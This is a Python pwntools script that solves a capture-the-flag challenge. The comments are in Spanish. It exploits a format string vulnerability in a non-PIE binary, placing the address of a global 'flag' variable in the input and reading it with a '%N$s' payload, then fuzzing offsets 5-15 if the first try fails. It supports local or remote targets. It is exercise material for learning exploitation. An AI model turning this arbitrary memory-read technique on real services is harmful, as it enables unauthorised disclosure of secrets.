#!/usr/bin/env python3
"""
Solución: medium-pwn-fmtstr
Técnica: Format String Vulnerability → lectura arbitraria de memoria

La variable global 'flag' tiene dirección fija (PIE=off).
El payload empaqueta esa dirección en los primeros 8 bytes del input.
%N$s la desreferencia como puntero y lee el contenido — la flag.
"""

import sys
from pwn import *

BINARY = './echo'
elf = ELF(BINARY, checksec=False)

FLAG_ADDR = elf.symbols['flag']
print(f"[*] flag @ {hex(FLAG_ADDR)}")

if args.REMOTE:
    host, port = sys.argv[2], int(sys.argv[3])
    p = remote(host, port)
else:
    p = process(BINARY)


def try_offset(off: int) -> bytes:
    """Envía p64(FLAG_ADDR) + %N$s y devuelve la respuesta."""
    p2 = remote(sys.argv[2], int(sys.argv[3])) if args.REMOTE else process(BINARY)
    p2.recvuntil(b'usuario: ')
    payload = p64(FLAG_ADDR) + f'%{off}$s'.encode()
    p2.sendline(payload)
    resp = p2.recvall(timeout=2)
    p2.close()
    return resp


# Si ya sabemos el offset (6 para -O0 -no-pie Ubuntu 22.04), usarlo directamente.
# De lo contrario, hacer fuzz del offset hasta encontrar la flag.
KNOWN_OFFSET = 6

p.recvuntil(b'usuario: ')
payload = p64(FLAG_ADDR) + f'%{KNOWN_OFFSET}$s'.encode()
p.sendline(payload)

output = p.recvall(timeout=3)
p.close()

print(f"[+] Output: {output}")

# Si el flag no aparece, probar offsets 5-15
if b'CTF{' not in output:
    print("[*] Offset 6 falló — probando offsets 5-15...")
    for off in range(5, 16):
        resp = try_offset(off)
        print(f"  offset={off}: {resp[:80]}")
        if b'CTF{' in resp:
            print(f"[+] Offset correcto: {off}")
            break
